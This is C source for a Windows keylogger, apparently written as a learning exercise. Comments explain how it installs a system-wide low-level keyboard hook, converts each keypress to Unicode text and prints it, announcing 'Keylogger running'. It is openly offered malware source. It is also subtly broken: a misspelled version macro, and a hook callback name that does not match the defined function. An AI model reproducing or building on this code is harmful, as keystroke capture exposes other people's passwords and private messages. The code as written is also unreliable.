
// This tells the compiler we're targeting Windows 2000 or later, for
// compatibility with WH_KEYBOARD_LL
#define _WIN32_WINIT 0x0500
#include <stdio.h>
#include <windows.h>

// HHOOK is a windows event, lets program monitor events in system like keyboard
// input Think of it like a  "subscribing to OS-level events" and HOOK is our
// subscription receipt
HHOOK hHook;

/*
nCode: determines if the message should be processed.

wParam: tells the type of keyboard message (like key down).

lParam: contains a pointer to a KBDLLHOOKSTRUCT with key event info.
*/
LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;

        // Get foreground window and thread
        HWND hwnd = GetForegroundWindow();
        DWORD fgThreadId = GetWindowThreadProcessId(hwnd, NULL);
        DWORD thisThreadId = GetCurrentThreadId();

        // Attach to foreground thread to get accurate keyboard state
        if (AttachThreadInput(thisThreadId, fgThreadId, TRUE)) {
            BYTE keyboardState[256];
            WCHAR buffer[5];

            if (GetKeyboardState(keyboardState)) {
                int result = ToUnicode(
                    p->vkCode,
                    p->scanCode,
                    keyboardState,
                    buffer,
                    sizeof(buffer) / sizeof(WCHAR),
                    0
                );

                if (result > 0) {
                    buffer[result] = L'\0';
                    wprintf(L"%ls", buffer);
                    fflush(stdout);
                }
            }

            // Detach
            AttachThreadInput(thisThreadId, fgThreadId, FALSE);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
int main() {
  MSG msg;

  /*
  Installs a low-level keyboard hook.

WH_KEYBOARD_LL: low-level keyboard hook type.

KeyboardProc: the callback function we defined.

NULL: means the hook procedure is in the same process.

0: thread ID (0 = hook all threads system-wide).
  */
  hHook =
      SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
  if (!hHook) {
    printf("Failed to install hook!\n");
    return -1;
  }

  printf("Keylogger running\n");

  /*
  GetMessage(&msg, NULL, 0, 0): Retrieves the next message from the message
queue.

TranslateMessage(&msg): Processes the message for character translation.

DispatchMessage(&msg): Sends the message to the window procedure or callback
function (KeyboardProc) for further processing.
  */
  while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  UnhookWindowsHookEx(hHook);
  return 0;
}
